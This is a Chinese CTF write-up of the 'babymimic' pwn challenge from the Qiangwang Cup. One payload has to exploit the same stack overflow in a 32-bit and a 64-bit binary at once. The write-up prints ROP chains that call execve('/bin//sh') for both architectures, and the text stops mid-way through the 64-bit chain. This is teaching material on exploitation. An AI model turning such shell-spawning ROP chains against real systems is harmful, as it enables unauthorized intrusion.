## 前言
拟态防御是什么，网上一搜就知道，在此不作详述了。想起一次见到拟态防御是在17年的工信部竞赛，当时知道肯定攻不破，连题目都没去打开。近期终于见到一些CTF比赛中出现拟态型的题目，题目不算太难，不过这种题型比较少见，特此记录一下。
## pwn（强网杯 babymimic）
打开压缩包，发现竟然有两个二级制文件，先检查一下保护
    [*] '/home/kira/pwn/qwb/_stkof'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    [*] '/home/kira/pwn/qwb/__stkof'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
两个二进制文件，一个是32位，一个是64位，均为静态编译，漏洞也很明显，是一个简单粗暴的栈溢出。
伪代码如下：
    int vul()
    {
      char v1; // 32位[esp+Ch] [ebp-10Ch]  64位[rsp+0h] [rbp-110h]
      setbuf(stdin, 0);
      setbuf(stdout, 0);
      j_memset_ifunc(&v1, 0, 256);
      read(0, &v1, 0x300);
      return puts(&v1);
    }
因为这是一题拟态的pwn题，跟传统题型相比，加入了拟态的检查机制，大概原理是：题目会同时启动32位程序和64位程序，而我们的输入会分别传入这个两个进程，每个程序一份，然后题目会检测两个程序的输出，若两个程序的输出不一致或任一程序或者异常退出，则会被判断为`check
down`，直接断开链接。只有两个程序的输入一致时，才能通过检查。因此，我们要做的就是构造一个payload，输入到32位程序和64位程序的时候，确保输出流完全一致，也就是用一个payload在32位程序和64位程序都能getshell。
如果不是拟态机制，这道题直接用`ROPgadget`生成ropchain就可以getshell，分分钟就被秒了。
    #!/usr/bin/env python2
            # execve generated by ROPgadget
            from struct import pack
            # Padding goes here
            p = ''
            p += pack('<I', 0x0806e9cb) # pop edx ; ret
            p += pack('<I', 0x080d9060) # @ .data
            p += pack('<I', 0x080a8af6) # pop eax ; ret
            p += '/bin'
            p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
            p += pack('<I', 0x0806e9cb) # pop edx ; ret
            p += pack('<I', 0x080d9064) # @ .data + 4
            p += pack('<I', 0x080a8af6) # pop eax ; ret
            p += '//sh'
            p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
            p += pack('<I', 0x0806e9cb) # pop edx ; ret
            p += pack('<I', 0x080d9068) # @ .data + 8
            p += pack('<I', 0x08056040) # xor eax, eax ; ret
            p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
            p += pack('<I', 0x080481c9) # pop ebx ; ret
            p += pack('<I', 0x080d9060) # @ .data
            p += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
            p += pack('<I', 0x080d9068) # @ .data + 8
            p += pack('<I', 0x080d9060) # padding without overwrite ebx
            p += pack('<I', 0x0806e9cb) # pop edx ; ret
            p += pack('<I', 0x080d9068) # @ .data + 8
            p += pack('<I', 0x08056040) # xor eax, eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x0807be5a) # inc eax ; ret
            p += pack('<I', 0x080495a3) # int 0x80
但是，32位和64位的汇编码完全不同，函数调用方式也是不同，要如何构造一条payload同时在32位和64位程序getshell呢。出题人非常友好地留了一个漏洞点给我们，留意到32位程序的溢出长度是`0x110`，而64位程序的溢出长度是`0x118`，差了8字节，这就给了我们空间可以构造特殊payload。
思路是：填充完`0x110`字节后，32位程序会到达ret位置，可以寻找一些控制esp的gadget，跳过后面64位的ret到达ropchain，同理64位也能寻找这种gadget跳过32位的ropchain。使用`ROPgadget`查找可以控制sp的gadget，类似`add
sp, 0xc; ret`，然后在payload中指定的位置放置ropchain。
非常幸运，找了两个大小合适的gadget，`ROPgadget`生成的ropchain注意需要修改一下，不然会导致输入过长，要控制payload的长度在0x300以内。
最后需要注意的是，`vul`函数结束时会调用`puts`，为保证输出相同，填充的垃圾数据要用`\x00`进行截断。
完整exp如下：
    from struct import pack
    # 32bit ropchain
    rop32 = ''
    rop32 += pack('<I', 0x0806e9cb) # pop edx ; ret
    rop32 += pack('<I', 0x080d9060) # @ .data
    rop32 += pack('<I', 0x080a8af6) # pop eax ; ret
    rop32 += '/bin'
    rop32 += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
    rop32 += pack('<I', 0x0806e9cb) # pop edx ; ret
    rop32 += pack('<I', 0x080d9064) # @ .data + 4
    rop32 += pack('<I', 0x080a8af6) # pop eax ; ret
    rop32 += '//sh'
    rop32 += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
    rop32 += pack('<I', 0x0806e9cb) # pop edx ; ret
    rop32 += pack('<I', 0x080d9068) # @ .data + 8
    rop32 += pack('<I', 0x08056040) # xor eax, eax ; ret
    rop32 += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
    rop32 += pack('<I', 0x080481c9) # pop ebx ; ret
    rop32 += pack('<I', 0x080d9060) # @ .data
    rop32 += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
    rop32 += pack('<I', 0x080d9068) # @ .data + 8
    rop32 += pack('<I', 0x080d9060) # padding without overwrite ebx
    rop32 += pack('<I', 0x0806e9cb) # pop edx ; ret
    rop32 += pack('<I', 0x080d9068) # @ .data + 8
    rop32 += pack('<I', 0x08056040) # xor eax, eax ; ret
    rop32 += pack('<I', 0x080a8af6) # pop eax ; ret
    rop32 += p32(0xb)
    rop32 += pack('<I', 0x080495a3) # int 0x80
    # 64bit ropchain
    rop64 = ''
    rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
    rop64 += pack('<Q', 0x00000000006a10e0) # @ .data
    rop64 += pack('<Q', 0x000000000043b97c) # pop rax ; ret
    rop64 += '/bin//sh'
    rop64 += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
    rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
    rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
    rop64 += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
    rop64 += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
    rop64 += pack('<Q', 0x00000000004005f6) # pop rdi ; ret
    rop64 += pack('<Q', 0x00000000006a10e0) # @ .data
    rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
    rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
    rop64 += pack('<Q', 0x000000000043b9d5) # pop rdx ; ret
    rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
    rop64 += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
    rop64 += pack('<Q', 0x000000000043b97c) # pop rax ; ret
    rop64 += p64(0x3b)